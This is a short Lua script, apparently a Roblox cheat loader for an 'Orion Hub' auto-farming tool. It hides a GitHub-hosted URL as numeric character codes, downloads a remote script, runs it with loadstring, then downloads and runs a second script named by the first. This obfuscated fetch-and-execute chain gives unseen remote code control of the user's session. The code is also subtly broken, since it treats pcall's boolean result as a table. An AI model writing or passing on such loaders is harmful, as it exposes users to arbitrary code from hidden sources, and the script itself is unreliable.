-- URL encoded as numbers
local urlParts = {
    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 77, 101, 108, 104, 97, 114, 112, 101, 114, 47, 71, 97, 98, 101, 66, 111, 97, 50, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 69, 110, 99, 111, 100, 101, 114, 76, 111, 97, 100, 101, 114, 46, 108, 117, 97
}

-- Convert the numbers back into the URL string
local function decodeUrlParts(parts)
    local url = ""
    for _, num in ipairs(parts) do
        url = url .. string.char(num)
    end
    return url
end

-- Decode the URL
local fullUrl = decodeUrlParts(urlParts)

-- Fetch the URL decoder script
local urlDecoderScript
local success, err = pcall(function()
    urlDecoderScript = game:HttpGet(fullUrl)
end)

if not success or not urlDecoderScript or urlDecoderScript == "" then
    warn("Failed to retrieve URL decoder script: " .. (err or "Unknown error"))
    return
end

-- Print the first 200 characters of the fetched script for debugging
print("Fetched script (first 200 characters):", string.sub(urlDecoderScript, 1, 200))

-- Execute the URL decoder script to get the URL and whitelist function
local urlDecoder, executionErr = pcall(loadstring(urlDecoderScript))

if not urlDecoder then
    warn("Error executing URL decoder script:", executionErr)
    return
end

-- Access the decoded URL and whitelist check function
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

if not decodedUrl or decodedUrl == "" then
    warn("Decoded URL is invalid or empty!")
    return
end

-- Check if the decoded URL is valid and not empty
local successLoad, loadErrorMessage = pcall(function()
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    loadstring(game:HttpGet(decodedUrl))()
end)

if not successLoad then
    warn("Error loading the script:", loadErrorMessage)
end
